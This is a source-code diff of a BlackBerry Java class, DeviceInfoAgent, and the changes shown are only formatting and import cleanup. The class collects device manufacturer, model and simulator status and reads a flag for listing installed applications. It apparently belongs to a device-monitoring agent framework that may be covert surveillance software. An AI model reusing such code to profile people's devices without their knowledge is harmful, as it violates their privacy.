@@ -15,7 +15,6 @@ import net.rim.device.api.system.ApplicationDescriptor;
 import net.rim.device.api.system.ApplicationManager;
 import net.rim.device.api.system.DeviceInfo;
 import net.rim.device.api.util.DataBuffer;
-import net.rim.device.api.util.NumberUtilities;
 import blackberry.Conf;
 import blackberry.Device;
 import blackberry.log.Log;
@@ -44,7 +43,8 @@ public final class DeviceInfoAgent extends Agent {
      *            the agent status
      */
     public DeviceInfoAgent(final boolean agentStatus) {
-        super(AGENT_DEVICE, agentStatus, Conf.AGENT_DEVICEINFO_ON_SD, "DeviceInfoAgent");
+        super(AGENT_DEVICE, agentStatus, Conf.AGENT_DEVICEINFO_ON_SD,
+                "DeviceInfoAgent");
         //#ifdef DBC
         Check.asserts(Log.convertTypeLog(agentId) == LogType.DEVICE,
                 "Wrong Conversion");
@@ -83,8 +83,8 @@ public final class DeviceInfoAgent extends Agent {
 
         // Modello
         sb.append("Processor: ARM\n");
-        if(DeviceInfo.isSimulator()){
-        sb.append("Simultator\n");
+        if (DeviceInfo.isSimulator()) {
+            sb.append("Simultator\n");
         }
         sb.append("Manifacturer: " + DeviceInfo.getManufacturerName() + "\n");
         sb.append("Model: " + DeviceInfo.getDeviceName() + "\n");
@@ -213,7 +213,7 @@ public final class DeviceInfoAgent extends Agent {
      * (non-Javadoc)
      * @see blackberry.agent.Agent#parse(byte[])
      */
-    protected boolean parse(final byte[] confParams) {               
+    protected boolean parse(final byte[] confParams) {
         final DataBuffer databuffer = new DataBuffer(confParams, 0,
                 confParams.length, false);
         try {
@@ -222,12 +222,12 @@ public final class DeviceInfoAgent extends Agent {
         } catch (final EOFException e) {
             return false;
         }
-        
+
         //#ifdef DEBUG_INFO
         debug.info("installedApplication: " + installedApplication);
-        
+
         //#endif
-        
+
         return true;
     }
 
